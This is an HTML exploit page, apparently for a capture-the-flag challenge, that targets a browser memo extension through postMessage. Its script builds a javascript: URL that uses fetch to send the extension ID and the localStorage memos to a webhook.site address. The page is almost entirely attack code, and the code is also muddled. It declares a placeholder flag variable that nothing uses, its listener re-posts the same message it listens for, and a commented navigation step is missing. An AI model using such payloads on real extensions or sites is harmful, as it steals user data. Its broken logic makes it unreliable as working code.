<!DOCTYPE html>
<html>
<head>
    <title>Exploit Page</title>
</head>
<body>
    <h1>Click the button to exploit</h1>
    <script>
        sendPayload()
        function sendPayload() {
            // This is the URL of the bot's server where the flag will be sent.
            const botUrl = "http://chal2.fwectf.com:8013/";
            
            // The flag is sent as the text of the memo.
            // The bot.js file reveals that the flag is in the URL fragment.
            // When the bot opens a new tab, the flag will be appended to the URL as a fragment.
            const memoText = "FLAG_PLACEHOLDER"; // Replace with the actual flag value.
            
            // Post a message to the content script to create a memo.
            window.addEventListener("message", (event) => {
                if (event.source !== window) return;
                if (event.data?.type === "create") {
                    const encodedUrl = encodeURIComponent(`javascript:fetch("https://webhook.site/XXXXX/" + document.querySelector("meta[memopad-extensionId]").getAttribute("memopad-extensionId") + "/" + localStorage.getItem("memos"))`);
                    window.postMessage({
                        type: 'create',
                        payload: encodedUrl
                    });
                }
            });

            // Wait a moment and then navigate to the popup page, which will trigger the URL with the fragment.
        }
    </script>
</body>
</html>
